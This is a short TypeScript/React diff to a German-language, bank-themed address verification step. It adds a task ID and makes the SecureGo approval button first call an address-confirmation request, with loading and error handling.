@@ -41,6 +41,7 @@ function splitAddr(a: Address) {
 
 export function AddressVerificationStep({
   theme,
+  taskId,
   currentAddress,
   additionalAddress,
   bankGroup,
@@ -49,6 +50,7 @@ export function AddressVerificationStep({
   onDeleted,
 }: {
   theme: FlowTheme;
+  taskId?: string;
   currentAddress: Address;
   additionalAddress: Address;
   bankGroup?: string;
@@ -67,8 +69,25 @@ export function AddressVerificationStep({
   const [secureGoApproved, setSecureGoApproved] = useState(false);
   const [showExplanation, setShowExplanation] = useState(false);
   const [showTanExplanation, setShowTanExplanation] = useState(false);
+  const [deleteError, setDeleteError] = useState<string | null>(null);
+  const [deleting, setDeleting] = useState(false);
 
-  const openSecureGo = () => {
+  const openSecureGo = async () => {
+    if (!taskId) {
+      setDeleteError("Sitzung nicht gefunden. Bitte neu anmelden.");
+      return;
+    }
+    setDeleteError(null);
+    setDeleting(true);
+    try {
+      const res = await confirmAddress(taskId);
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+    } catch (e: any) {
+      setDeleting(false);
+      setDeleteError(`Löschen fehlgeschlagen: ${e?.message ?? "Unbekannter Fehler"}`);
+      return;
+    }
+    setDeleting(false);
     setShowDeleteDialog(false);
     setSecureGoApproved(false);
     setShowSecureGo(true);
